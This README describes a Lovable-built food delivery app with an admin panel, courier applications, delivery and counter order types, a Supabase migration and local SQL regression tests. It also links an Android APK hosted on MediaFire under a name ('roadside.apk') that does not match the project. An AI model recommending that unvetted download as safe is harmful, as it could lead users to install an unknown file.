# Flavorfleet Courier Hub

built me a food delivery all with admin panel. also add login/register system. and add also register application for courier if they want to apply as food delivery rider

**Live app**: https://flavorfleet-courier-hub.lovable.app
**Download app**: https://www.mediafire.com/file/3f5jjajaj0whn6y/roadside.apk/file

- **Ship faster**: describe what you want to build and Lovable handles the code.
- **Stay in sync**: every change made in Lovable is committed straight to this repository.
- **Full ownership**: this code is yours. Push to `main` on GitHub and your changes sync back into Lovable, ready for your next prompt.

## Development

Prefer working locally? You need Node.js and npm — [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating).

```sh
git clone <this-repository-url>
cd <repository-name>
npm i
npm run dev
```

## Delivery and counter orders

Apply `drizzle/migrations/0007_order_types.sql` to the Supabase database after
migrations `0000` through `0006`, before deploying the updated checkout. You can
run the complete file in the Supabase SQL Editor. It runs in a transaction and
refreshes the PostgREST schema cache. This change has to be applied to the database;
starting the frontend alone does not install it.

Checkout supports **Delivery** (₱49 delivery fee, cash on delivery) and
**Counter / Walk-in** (no delivery fee, pay at counter). Prices and fees are
calculated by `place_order`, using menu prices from the database. Existing orders
remain deliveries with their original totals; older six-argument RPC callers
continue to place deliveries.

Admins can filter both types. Counter orders move through Pending → Preparing →
Ready, then **Mark Claimed** completes collection. Customers see “Claimed” in
tracking. Counter orders never enter rider dispatch. Delivery completion still
requires an assigned rider, pickup and an order-specific proof photo. Order type
cannot be changed after placement.

### Local SQL regression checks

Run against an **empty, disposable local PostgreSQL database**, as a local
superuser (the script creates minimal auth/storage scaffolding and synthetic data):

```sh
createdb flavorfleet_order_types_test
psql -X -v ON_ERROR_STOP=1 -d flavorfleet_order_types_test -f scripts/test-order-types.sql
dropdb flavorfleet_order_types_test
```

The checks apply all migrations and cover legacy compatibility, database pricing,
customer/admin/rider visibility, counter collection, invalid-order rollback and
preservation of delivery photo requirements. Frontend regression checks run with
`npm test`.
